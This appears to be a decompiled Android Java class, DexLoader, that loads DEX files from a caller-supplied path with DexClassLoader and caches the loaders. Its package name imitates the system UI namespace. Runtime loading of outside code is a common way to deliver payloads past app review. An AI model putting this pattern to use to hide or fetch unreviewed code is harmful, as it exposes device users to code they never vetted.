package com.android.systemui.assis.core;

import android.content.Context;
import android.text.TextUtils;
import com.android.systemui.assis.app.LOG;
import dalvik.system.DexClassLoader;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;

public class DexLoader {
    private static final String TAG = "DexLoader";
    private static Map<String, DexClassLoader> loaders = new ConcurrentHashMap();

    public static synchronized DexClassLoader loadDex(Context context, String targetPath, String md5) {
        DexClassLoader loader;
        synchronized (DexLoader.class) {
            if (TextUtils.isEmpty(md5)) {
                md5 = String.valueOf(new Random().nextInt(100000));
            }
            loader = (DexClassLoader) loaders.get(md5);
            if (loader == null || loader.getParent() == null) {
                loader = new DexClassLoader(targetPath, context.getCacheDir().getAbsolutePath(), null, context.getClassLoader());
                loaders.put(md5, loader);
            }
        }
        return loader;
    }

    public static Class<?> loadClass(DexClassLoader loader, String clsName) {
        Class<?> cls = null;
        try {
            cls = loader.loadClass(clsName);
        } catch (ClassNotFoundException e) {
            LOG.E(TAG, "ClassNotFoundException " + e.getMessage());
        }
        return cls;
    }
}
